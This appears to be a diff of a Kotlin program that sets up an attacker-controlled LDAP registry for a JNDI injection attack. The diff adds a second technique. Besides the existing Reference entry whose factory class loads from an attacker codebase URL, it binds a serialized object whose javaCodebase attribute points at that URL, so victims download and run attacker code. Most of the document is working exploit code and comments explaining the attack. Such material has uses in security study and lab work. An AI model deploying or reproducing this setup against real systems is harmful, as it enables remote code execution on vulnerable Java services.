@@ -1,27 +1,42 @@
-// Initialize the LDAP registry with a `Reference`
+// Initialize the LDAP registry
 //
-// The victim will query the LDAP registry for a class. We want to return a
-// `Reference` to an object. It will have the class of the object, as well as a
-// factory to use to make it. This factory class will then be downloaded an
-// attacker-controlled URL and executed on the victim.
+// The victim will query the LDAP registry for a class. There are two things we
+// can return.
 //
-// This Kotlin program just initializes the LDAP registry with this reference.
+// Option 1: References
+// --------------------
+// We can to return a `Reference` to an object. It will have the name of the
+// class of the object, as well as a factory to use to make it. This factory
+// class will then be downloaded an attacker-controlled URL and executed on the
+// victim.
+//
+// Option 2: Serialized Objects
+// ----------------------------
+// Alternatively, we can return an object that was serialized and put in the
+// registry. There is no trickery here with factory classes. It gets the data
+// associated with the *object*, then downloads the corresponding *class* from
+// an attacker-controlled URL.
+//
+// This Kotlin program just initializes the LDAP registry with both options.
 // This would more practically be done with an LDIF file, but this can work too.
-// It puts at the path `cn=made-class,dc=ldap-registry,dc=attacker` a
+// For Option 1, it puts at `cn=made-class,dc=ldap-registry,dc=attacker` a
 // `Reference` to an object of type `MadeClass`. It specifies that the class
 // `FactoryClass` should be used to construct it, and that the `.class` files
-// for both of these classes can be found at a particular URL.
+// for both of these classes can be found at a particular URL. For Option 2, it
+// puts the serialized data at `cn=serialized-class` with the same domain
+// components as above.
 
 
 import java.util.Hashtable
 
 import javax.naming.Context
-import javax.naming.InitialContext
+import javax.naming.directory.DirContext
+import javax.naming.directory.InitialDirContext
 
 import javax.naming.Reference
+import javax.naming.directory.BasicAttributes
 
 import javax.naming.CommunicationException
-import javax.naming.directory.InvalidAttributeValueException
 
 
 // Default addresses to use in case none were specified at the command-line
@@ -69,14 +84,14 @@ fun main() {
     // The server might not be up when we first start this service, so we loop
     //  until we're able to connect. That's all the helper function does. Aside
     //  from the looping, it just does `InitialContext(env)`.
-    var ctx: Context? = null
+    var ctx: DirContext? = null
     while(ctx == null) {
         try {
             // The server might prematurely accept our connection
             // Resolve this in the most jank way possible - by sleeping. It
             //  takes about two seconds for the setup to finish on my computer,
             //  so sleep for five.
-            ctx = InitialContext(env)
+            ctx = InitialDirContext(env)
             println("Connected!")
             Thread.sleep(5000)
 
@@ -88,11 +103,16 @@ fun main() {
     }
 
     // Add the reference to the registry
-    // Use `rebind` instead of `bind` if something was already there from a
-    //  previous run
     ctx.rebind(
         "cn=made-class",
-        Reference("MadeClass", "FactoryClass", attacker_codebase_url)
+        Reference("MadeClass", "FactoryClass", attacker_codebase_url),
+    )
+    // Same for the serialized class
+    // Need to manually add the codebase
+    ctx.rebind(
+        "cn=serialized-class",
+        SerializedClass("Serialized Object's Message"),
+        BasicAttributes("javaCodebase", attacker_codebase_url),
     )
 
     // For good measure
